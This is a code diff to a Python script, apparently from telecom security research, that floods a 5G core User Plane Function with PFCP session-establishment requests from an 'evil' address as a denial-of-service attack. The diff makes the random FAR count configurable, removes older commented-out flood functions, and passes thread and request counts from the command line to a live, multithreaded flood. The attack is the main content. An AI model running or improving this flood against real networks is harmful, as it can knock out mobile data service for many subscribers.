@@ -192,7 +192,7 @@ class Ez_PFCP:
 
 
 class PFCPDosAttack:
-    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False):
+    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15):
         self.evil_addr = evil_addr
         self.upf_addr = upf_addr
         self.src_port = src_port
@@ -208,7 +208,14 @@ class PFCPDosAttack:
         self.prepare = prepare
         self.randomize = randomize
         self.lock = threading.Lock()
+        self.random_far_number = random_far_number
         
+    def set_random_far_number(self, random_far_number=15):
+        self.random_far_number = random_far_number
+        if not self.verbose : return
+        if random_far_number:
+            print(f"[DoS] Random FAR number set to {random_far_number}")
+
     def set_randomize(self, randomize=True):
         self.randomize = randomize
         if not self.verbose : return
@@ -289,7 +296,7 @@ class PFCPDosAttack:
                 ue_addr=self.new_ue_addr(),
                 teid=self.new_teid(),
                 random_seq=self.randomize,
-                random_far_number=29
+                random_far_number=self.random_far_number
                 ))
             
             now = time.time()
@@ -376,65 +383,10 @@ class PFCPDosAttack:
 # Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
 #                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
 
-# #works
-# pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# pfcp_dos_obj.set_verbose(True)
-# pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1000, num_threads=10)
-
-
-
-
-
-
-
-
-# TODO: Utiliser le bon plan d'adresse
-# ezpfcp = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# ezpfcp.Send_PFCP_association_setup_req()
-# # ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
-# ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.2.6")
-
-
-# pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
-#         for i in range(count):
-#             self.pfcp_association_packet_list.append(pfcp_obj.Build_PFCP_association_setup_req())
-#             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
-#                 seid=self.new_seid(), 
-#                 ue_addr=self.new_ue_addr(),
-#                 teid=self.new_teid()))
-
-
-
-# monseidbidon = 0x1
-
-# def increment_monseid():
-#     global monseidbidon
-#     monseidbidon += 1
-#     if monseidbidon > 0xFFFFFFFFFFFFFFFF:
-#         monseidbidon = 1
-#     return monseidbidon
-
-# ue_base_addr_bidon = "1.1.1.1"
-
-# def increment_base_addr_bidon():
-#     global ue_base_addr_bidon
-#     ue_base_addr_bidon = ipaddress.IPv4Address(ue_base_addr_bidon) + 1
-#     return str(ue_base_addr_bidon)
-
-# def flood_attack(evil_addr, upf_addr, src_port, dest_port, count, ue_base_addr="1.1.1.1"):
-#     pfcp_obj = Ez_PFCP(evil_addr, upf_addr, src_port, dest_port)
-#     pfcp_obj.Send_PFCP_association_setup_req()
-#     for i in range(count):
-#         pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid(), ue_addr=increment_base_addr_bidon())
-        
-
-
-# flood_attack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 1000)
-
-
 
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.set_randomize(True)
 objet_dos.set_prepare(True)
+objet_dos.set_random_far_number(int(sys.argv[3]))
 objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
